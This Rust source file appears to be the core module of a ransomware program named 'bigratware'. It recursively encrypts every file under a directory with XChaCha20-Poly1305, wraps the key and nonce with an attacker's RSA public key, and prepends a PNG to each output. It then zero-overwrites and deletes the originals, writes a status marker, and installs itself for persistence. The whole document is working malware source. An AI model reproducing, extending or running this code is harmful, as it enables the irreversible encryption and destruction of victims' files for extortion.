use std::fs::{File, OpenOptions, remove_file};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use anyhow::{Context, Result};
use chacha20poly1305::aead::OsRng;
use chacha20poly1305::aead::stream::EncryptorBE32;
use chacha20poly1305::{KeyInit, XChaCha20Poly1305};
use rand::prelude::ThreadRng;
use rand::RngCore;
use rsa::{Oaep, RsaPublicKey};
use sha2::Sha512;
use decryptor::helpers::gen_new_path;
use crate::BIGRAT_PNG;
use crate::startup::install_self;
use crate::status_file::create_status_file;

const BUFFER_SIZE: usize = 500;

pub const STATUS_VERIFY_STR: &[u8; 10] = b"bigratware";
pub const STATUS_VERIFY_ENCRYPTED_STR_LEN: usize = 26;

fn encrypt_file(
    source_file: &mut File,
    dist_path: &Path,
    encrypted_key: &[u8],
    encrypted_nonce: &[u8],
    aead: XChaCha20Poly1305,
    nonce: &[u8],
) -> Result<()> {
    let mut dist_file = OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(dist_path)
        .with_context(|| format!("Failed to create or open a destination file {}", dist_path.display()))?;

    dist_file.set_len(0)?;
    dist_file.write_all(BIGRAT_PNG)?;

    dist_file.write_all(encrypted_key)?;
    dist_file.write_all(encrypted_nonce)?;

    let mut stream_encryptor = EncryptorBE32::from_aead(aead, nonce.as_ref().into());

    let mut buffer = [0u8; BUFFER_SIZE];
    loop {
        let read_count = source_file.read(&mut buffer)?;
        if read_count == BUFFER_SIZE {
            let ciphertext = stream_encryptor.encrypt_next(buffer.as_slice()).unwrap();
            let _ = dist_file.write(&ciphertext)?;
        } else {
            let ciphertext = stream_encryptor.encrypt_last(&buffer[..read_count]).unwrap();
            let _ = dist_file.write(&ciphertext)?;
            break;
        }
    }

    Ok(())
}

fn encrypt_dir_recursive(
    base_path: &Path,
    current_path: &Path,
    aead: &XChaCha20Poly1305,
    nonce: &[u8],
    encrypted_key: &[u8],
    encrypted_nonce: &[u8],
) -> Result<()> {
    for entry in current_path.read_dir()? {
        let entry = entry?;
        if entry.file_type()?.is_dir() {
            if let Err(err) = encrypt_dir_recursive(
                base_path,
                &entry.path(),
                aead,
                nonce,
                encrypted_key,
                encrypted_nonce
            ) {
                eprintln!("Error encrypting directory {:?}: {}", entry.path(), err);
            }
            continue;
        }

        if current_path == base_path && entry.file_name().to_str().unwrap() == ".bigrat-status" {
            continue;
        }

        let mut file = match File::open(entry.path()) {
            Ok(file) => file,
            Err(e) => {
                eprintln!("Failed to open file {}: {}", entry.path().display(), e);
                continue;
            },
        };

        let new_path = match gen_new_path(
            PathBuf::from(&format!("{}.png", entry.path().display())),
            false,
        ) {
            Ok(path) => path,
            Err(e) => {
                eprintln!("Failed to generate a destination file name from source file {:?}: {}", entry.path(), e);
                continue;
            }
        };

        if let Err(e) = encrypt_file(
            &mut file,
            &new_path,
            encrypted_key,
            encrypted_nonce,
            aead.clone(),
            nonce,
        ) {
            eprintln!("Failed to encrypt a file {:?}: {}", entry.path(), e);
            continue;
        };

        let mut file = OpenOptions::new()
            .write(true)
            .open(entry.path())?;

        if let Err(e) = file.write(&vec![0u8; file.metadata().unwrap().len() as usize]) {
            eprintln!("Failed to overwrite file \"{}\": {e}", entry.path().display());
        };
        if let Err(e) = remove_file(entry.path()) {
            eprintln!("Failed to remove file \"{}\": {e}", entry.path().display());
        }
    }

    Ok(())
}

pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut ThreadRng) -> Result<()> {
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 19];
    OsRng.fill_bytes(&mut key);
    OsRng.fill_bytes(&mut nonce);

    let encrypted_key = public_key.encrypt(rng, Oaep::new::<Sha512>(), &key)
        .with_context(|| "Failed to encrypt the key")?;
    let encrypted_nonce = public_key.encrypt(rng, Oaep::new::<Sha512>(), &nonce)
        .with_context(|| "Failed to encrypt the nonce")?;

    let mut status_file = create_status_file(
        path,
        &encrypted_key,
        &encrypted_nonce,
        &key,
        &nonce,
    )?;

    let aead = XChaCha20Poly1305::new(key.as_ref().into());

    encrypt_dir_recursive(path, path, &aead, &nonce, &encrypted_key, &encrypted_nonce)?;

    status_file.write_all(b"BIGRATWARE_STATUS=finished;")
        .with_context(|| "Failed to write to a status file")?;

    install_self()?;

    Ok(())
}
